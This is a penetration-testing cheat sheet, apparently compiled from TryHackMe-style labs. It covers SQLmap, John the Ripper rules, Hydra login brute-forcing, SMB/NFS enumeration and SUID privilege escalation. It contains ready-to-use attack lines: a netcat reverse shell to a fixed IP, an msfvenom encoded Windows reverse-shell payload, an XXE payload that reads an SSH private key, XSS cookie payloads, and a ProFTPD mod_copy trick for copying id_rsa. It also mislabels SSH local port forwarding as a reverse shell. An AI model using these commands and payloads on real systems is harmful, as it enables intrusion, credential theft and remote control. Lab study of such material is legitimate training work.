### Metasploit 
msfvenom --list formats
msfvenom -l payloads

### Upload to SMBServer
curl --upload-file /root/windowsshell.exe -u 'RELEVANT\Bob' smb://10.10.224.160/nt4wrksv/
then curl -u 'RELEVANT\Bob' smb:10.10.224.160/nt4wrksv

### Default Ports with TLS
HTTPS - 443
FTPS - 990
SMTPS - 465
POP3S - 995
IMAPS - 993

### Sockets running on a host
We will use a tool called **ss** to investigate sockets running on a host.
If we run **ss -tulpn** it will tell us what socket connections are running


-t
Display TCP sockets

-u
Display UDP sockets

-l
Displays only listening sockets

-p
Shows the process using the socket

-n
Doesn't resolve service names

Check what services are blocked by a firewall using iptables
say the port is 10000 then you can create a reverse ssh shell like here -
`ssh -L 10000:localhost:10000 agent47@10.10.192.101`

### SQLmap
sqlmap -r requests.txt --dbms=mysql --dump
  Enumeration:
    These options can be used to enumerate the back-end database
    management system information, structure and data contained in the
    tables

    -a, --all           Retrieve everything
    -b, --banner        Retrieve DBMS banner
    --current-user      Retrieve DBMS current user
    --current-db        Retrieve DBMS current database
    --passwords         Enumerate DBMS users password hashes
    --tables            Enumerate DBMS database tables
    --columns           Enumerate DBMS database table columns
    --schema            Enumerate DBMS schema
    --dump              Dump DBMS database table entries
    --dump-all          Dump all DBMS databases tables entries
    -D DB               DBMS database to enumerate
    -T TBL              DBMS database table(s) to enumerate
    -C COL              DBMS database table column(s) to enumerate



### John
**List formats** - john --list=formats | grep -iF "md5" 
**Example** - john --format=Raw-SHA1 --wordlist=/usr/share/wordlists/rockyou.txt hash2.txt 
**Single (Word Mangling)** - john --single --format=Raw-MD5 hash7.txt

[The best way to show what Single Crack mode is,  and what word mangling is, is to actually go through an example:
If we take the username: Markus
Some possible passwords could be:
-   Markus1, Markus2, Markus3 (etc.)
-   MArkus, MARkus, MARKus (etc.)
-   Markus!, Markus$, Markus* (etc.)]]

**How to create Custom Rules**
Custom rules are defined in the `john.conf` file, usually located in `/etc/john/john.conf` if you have installed John using a package manager or built from source with `make` and in `/opt/john/john.conf` on the TryHackMe Attackbox.  
Let's go over the syntax of these custom rules, using the example above as our target pattern. Note that there is a massive level of granular control that you can define in these rules, I would suggest taking a look at the wiki [here](https://www.openwall.com/john/doc/RULES.shtml) in order to get a full view of the types of modifier you can use, as well as more examples of rule implementation.
The first line:
`[List.Rules:THMRules]` - Is used to define the name of your rule, this is what you will use to call your custom rule as a John argument.

We then use a regex style pattern match to define where in the word will be modified, again- we will only cover the basic and most common modifiers here:
`Az` - Takes the word and appends it with the characters you define  
`A0` - Takes the word and prepends it with the characters you define  
`c` - Capitalises the character positionally

These can be used in combination to define where and what in the word you want to modify.

Lastly, we then need to define what characters should be appended, prepended or otherwise included, we do this by adding character sets in square brackets `[ ]` in the order they should be used. These directly follow the modifier patterns inside of double quotes `" "`. Here are some common examples:

`[0-9]` - Will include numbers 0-9  
`[0]` - Will include only the number 0  
`[A-z]` - Will include both upper and lowercase  
`[A-Z]` - Will include only uppercase letters  
`[a-z]` - Will include only lowercase letters  
`[a]` - Will include only a  
`[!£$%@]` - Will include the symbols !£$%@  

Putting this all together, in order to generate a wordlist from the rules that would match the example password "Polopassword1!" (assuming the word polopassword was in our wordlist) we would create a rule entry that looks like this:

`[List.Rules:PoloPassword]`
`cAz"[0-9] [!£$%@]"`

In order to:
Capitalise the first  letter - `c`
Append to the end of the word - `Az`
A number in the range 0-9 - `[0-9]`
Followed by a symbol that is one of `[!£$%@]`

**Using Custom Rules**
We could then call this custom rule as a John argument using the  `--rule=PoloPassword` flag.  
As a full command: `john --wordlist=[path to wordlist] --rule=PoloPassword [path to file]`

### Zip/RAR/SSH Cracking
`zip2john/rar2john/ssh2john [options] [zip file] > [output file]`
`john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt`

### Hydra Example
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.11.225 http-post-form "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=ufSTUXq%2FcqG3Acg8QuSanIoGPo17wG6Ew1qJi8xUxN%2B8yvEcAk0MMoTMSYOdFk9dw1mGP23lAlWscFN16SgpH5u2fRwKEQS5CscRuR%2B%2FEj57ReFjsuv7uy2DITukr3cmwW4hDZh3bsjnbVHo%2BO4btCJFhDR5HCDZAia7i4kcHotq2Cxc&__EVENTVALIDATION=AuV7u%2BGl46vBDnsjzeiDV5r0ZcYwotc1r66H5XF7%2FqPY3Kr1x4x%2FtCQn%2F51Z3hUNDMaTFo5MgEKUZszMtB1Pt3K5j3%2BVQ3M4ffH1uMFqG9ssOsU3cnlEJH1lw68DnitH52be4qzHdEFrgMKwRAHTVfZqn%2B7xkdYfWOYIw8cRW838WhHH&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed" 
```

### SMTP
msf has smtp_enum but apparently smtp-user-enum works better.

### NFS
##### To mount shares - 
sudo mount -t nfs IP:share /tmp/mount -nolock (mkdir /tmp/mount would be advisable)
##### To show NFS shares -
/usr/sbin/showmount -e IP
##### To unmount if server is closed -
umount -f -l /tmp/mount/


### For FTP, Telnet and SMB
Try anonymous with no password

### EnumLinux
Use it for smb enumeration. for full enumeration use -a
-U             get userlist  
-M             get machine list  
-N             get namelist dump (different from -U and-M)  
-S             get sharelist  
-P             get password policy information  
-G             get group and member list

### SSH
Chmod 600 any id_rsas you download

###  Check for files with SUID bit
find / -perm -u=s -type f 2>/dev/null
set permissions by doing chmod u+s and then chmod +x (on bash if possible)
then ./bash -p

###  SMB Enum Shares and Users
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.104.184

## Telnet Reverse UNIX Shell
.RUN mkfifo /tmp/zhxsn; nc 10.17.47.25 4444 0</tmp/zhxsn | /bin/sh >/tmp/zhxsn 2>&1; rm /tmp/zhxsn

###  SMB connect 
smbclient //ip/sharename

###  SMB Download Share/File
smbget -R smb://ip/sharename
within cli, mget [whatever file]

#####  Your earlier nmap port scan will have shown port 111 running the service rpcbind. This is just a server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started,  it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve. In our case, port 111 is access to a network file system. Lets use nmap to enumerate this.

nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.104.184

###### The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.

Ex. SITE CPFR /home/kenobi/.ssh/id_rsa (Checks if id_rsa exists for some ssh user)
SITE CPTO /var/tmp/id_rsa (Copies)

### SSH connect with id_rsa (private key)
ssh -i id_rsa user@ip

###  Windows MSFVenom
msfvenom -p windows/shell_reverse_tcp LHOST=10.17.47.25 LPORT-4443 -e x86/shikata_ga_nai -f exe -o ASCService.exe

###  XXE Payload
<?xml+version="1.0"?>
<!DOCTYPE+root+[<!ENTITY+read+SYSTEM+'file:///home/falcon/.ssh/id_rsa'>]>
<root>&read;</root>

###  XSS Payloads you can do
<script>alert(document.session)</script>
<script>alert(document.cookie)</script>
<script>document.getElementbyId("something").innerHTML="blahblah"</script>
<iframe src="javascript:alert(`xss`)"/>  (DOM)


### If you want to download an inaccessible file you can append %2500 near the extension of the file you want to download
for eg. to download x.jpg you would do x.jpg%2500allowedextension

